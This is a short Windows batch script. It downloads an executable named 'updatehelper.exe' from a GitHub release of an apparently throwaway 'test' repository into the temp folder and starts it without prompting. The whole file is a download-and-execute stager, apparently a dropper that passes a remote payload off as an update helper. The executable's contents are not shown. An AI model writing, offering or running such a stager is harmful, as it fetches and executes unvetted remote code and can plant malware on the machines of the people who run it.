@echo off
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/wabor1/test/releases/download/1/updatehelper.exe', '%TEMP%\updatehelper.exe')"
if exist "%TEMP%\updatehelper.exe" (
    start "" "%TEMP%\updatehelper.exe"
) else (
    echo Download failed.
)
exit   
